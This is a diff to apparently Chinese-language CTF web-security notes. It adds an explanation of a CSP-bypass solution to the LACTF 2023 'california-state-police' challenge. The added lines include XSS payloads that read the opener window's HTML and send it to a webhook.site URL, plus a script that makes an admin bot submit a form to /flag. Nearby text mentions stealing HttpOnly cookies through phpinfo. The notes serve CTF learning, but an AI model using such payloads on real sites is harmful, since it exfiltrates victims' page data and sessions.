@@ -781,7 +781,25 @@ UUIDv1 = str(uuid1(node=0x67696E6B6F69, clock_seq=0b10101001100100))
 </script>
 ```
 
-例题:[california-state-police](https://blog.jaquiez.dev/Blog/LACTF2023/#CSP)
+例题:[california-state-police](https://blog.jaquiez.dev/Blog/LACTF2023/#CSP)。能成功的原因在于：根据[MDN文档](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)，window.open会在目标的环境（context）打开一个空白窗口，意味着同域内的内容可用js访问。
+
+该题的另外一种[做法](https://hackmd.io/@lamchcl/r1zQkbvpj#cryptohill-easy)思路差不多，不过用了两个report：
+
+```html
+<script>
+setTimeout(()=>{location="https://webhook.site/ac78b7a4-1e35-4fd9-ac25-83a47c4ecf09?a="+encodeURIComponent(window.opener.document.documentElement.outerHTML)},200)
+</script>
+```
+
+```html
+<form action="/flag" method=POST></form>
+<script>
+window.open("/report/11da7ab4-821d-4f2f-8ea1-e829d74a6366", target="_blank")
+document.forms[0].submit();
+</script>
+```
+
+后者是提交给admin bot的report。发现主要思路还是利用form访问flag然后利用打开的另一个窗口将内容带出来。
 
 如果非要在开启HttpOnly的情况下获取cookie，在php驱动的网站下，尝试找phpinfo界面，里面有个HTTP_COOKIE字段。xss让bot访问phpinfo界面，找HTTP_COOKIE字段就能拿到cookie了。脚本参考：
 
